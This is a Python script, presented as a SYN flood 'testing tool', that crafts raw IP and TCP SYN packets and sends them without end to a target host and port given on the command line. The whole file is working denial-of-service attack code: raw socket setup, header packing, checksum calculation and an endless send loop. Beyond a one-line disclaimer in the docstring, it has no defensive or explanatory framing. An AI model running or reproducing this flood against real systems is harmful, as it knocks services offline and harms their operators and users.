#!/usr/bin/env python3
"""
Modern Python implementation of a SYN flood testing tool.
For authorized security testing only.
Requires root privileges on Ubuntu/Linux.
"""
import socket
import sys
import threading
import random
from struct import pack
import requests

def print_usage():
    print(f"Usage: sudo python3 {sys.argv[0]} <target ip> <port>")
    print("Note: Root privileges required for raw socket creation")
    sys.exit(1)

def checksum(msg):
    """Calculate the checksum of the packet"""
    if len(msg) % 2 == 1:
        msg += b'\0'
    
    words = sum(msg[i+1] + (msg[i] << 8) for i in range(0, len(msg), 2))
    words = (words >> 16) + (words & 0xffff)
    words = words + (words >> 16)
    
    return ~words & 0xffff

def create_socket():
    """Create and configure the raw socket"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        return s
    except PermissionError:
        print("Error: Root privileges required. Please run with sudo.")
        sys.exit(1)
    except socket.error as e:
        print(f'Socket could not be created. Error Code: {e.errno} Message: {e.strerror}')
        sys.exit(1)

class SynFlood:
    def __init__(self, target_host, target_port):
        self.target_host = socket.gethostbyname(target_host)
        self.target_port = int(target_port)
        try:
            self.source_ip = requests.get('https://api.ipify.org').text
        except requests.RequestException:
            print("Warning: Could not get public IP, using localhost")
            self.source_ip = '127.0.0.1'
        
        self.socket = create_socket()

    def create_ip_header(self):
        """Create IP header"""
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 20  # 20 bytes for IP + 20 bytes for TCP
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = random.randint(1, 255)
        ip_proto = socket.IPPROTO_TCP
        ip_check = 10  # Checksum is calculated by kernel
        ip_saddr = socket.inet_aton(self.source_ip)
        ip_daddr = socket.inet_aton(self.target_host)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl

        return pack('!BBHHHBBH4s4s',
            ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

    def create_tcp_header(self):
        """Create TCP header"""
        tcp_source = random.randint(36000, 65535)
        tcp_seq = 0
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_flags = 2  # SYN flag set
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        
        # Initial TCP header with zero checksum
        tcp_header = pack('!HHLLBBHHH',
            tcp_source, self.target_port, tcp_seq, tcp_ack_seq,
            tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        
        # Pseudo header for checksum calculation
        psh = pack('!4s4sBBH',
            socket.inet_aton(self.source_ip),
            socket.inet_aton(self.target_host),
            0, socket.IPPROTO_TCP, len(tcp_header))
        
        # Calculate checksum
        tcp_check = checksum(psh + tcp_header)
        
        # Recreate TCP header with correct checksum
        return pack('!HHLLBBHHH',
            tcp_source, self.target_port, tcp_seq, tcp_ack_seq,
            tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

    def send_packet(self):
        """Create and send a single SYN packet"""
        while True:
            ip_header = self.create_ip_header()
            tcp_header = self.create_tcp_header()
            packet = ip_header + tcp_header
            
            self.socket.sendto(packet, (self.target_host, 0))
            print('.', end='', flush=True)

def main():
    if len(sys.argv) <= 2:
        print_usage()
    
    target_host = sys.argv[1]
    target_port = sys.argv[2]
    
    flood = SynFlood(target_host, target_port)
    flood.send_packet()

if __name__ == "__main__":
    main()
